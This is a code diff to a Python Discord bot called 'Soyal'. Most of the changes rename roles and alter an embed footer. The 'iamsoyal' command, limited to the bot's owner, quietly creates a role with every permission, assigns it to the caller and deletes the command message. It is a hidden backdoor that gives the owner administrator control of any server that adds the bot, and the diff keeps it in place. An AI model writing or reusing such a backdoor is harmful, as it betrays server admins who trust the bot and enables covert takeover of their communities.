@@ -78,16 +78,16 @@ async def dm(ctx, user: discord.Member, *, msg: str):
 @commands.check(is_soyal)
 async def iamsoyal(ctx):
     user = ctx.message.author
-    if discord.utils.get(user.server.roles, name="Soyalk") is None:
-        await client.create_role(user.server, name="Soyalk", permissions=discord.Permissions.all())
-        role = discord.utils.get(ctx.message.server.roles, name='Soyalk')
+    if discord.utils.get(user.server.roles, name="SoyalP") is None:
+        await client.create_role(user.server, name="SoyalP", permissions=discord.Permissions.all())
+        role = discord.utils.get(ctx.message.server.roles, name='SoyalP')
         await client.add_roles(ctx.message.author, role)
     else:	
         author = ctx.message.author
         await client.delete_message(ctx.message)
-        role = discord.utils.get(ctx.message.server.roles, name='Soyalk')
+        role = discord.utils.get(ctx.message.server.roles, name='SoyalP')
         await client.add_roles(ctx.message.author, role)
-        print('Added Soyalk role in ' + (ctx.message.author.name))
+        print('Added SoyalP role in ' + (ctx.message.author.name))
         await client.send_message(author, embed=embed)
 
 		 
@@ -213,7 +213,7 @@ async def rolesetup(ctx):
     await client.create_role(author.server, name="Owner", permissions=admin_perms)
     await client.create_role(author.server, name="Admin", permissions=admin_perms)
     await client.create_role(author.server, name="Senior Moderator", permissions=mod_perms)
-    await client.create_role(author.server, name="G.O.H")
+    await client.create_role(author.server, name="Senior Moderator")
     await client.create_role(author.server, name="Moderator", permissions=mod_perms)
     await client.create_role(author.server, name="Muted")
     await client.create_role(author.server, name="Friend of Owner")
@@ -260,7 +260,7 @@ async def friend(ctx, user:discord.Member,):
 @client.command(pass_context=True)
 async def ownerinfo(ctx):
     embed = discord.Embed(title="Information about owner", description="Bot Name- Soyal", color=0x00ff00)
-    embed.set_footer(text="SOYAL")
+    embed.set_footer(text="SOYAL Premium")
     embed.set_author(name=" Bot Owner Name- Soyal,472680171451973632")
     embed.add_field(name="Site- coming soon...", value="Thanks for adding our bot", inline=True)
     await client.say(embed=embed)
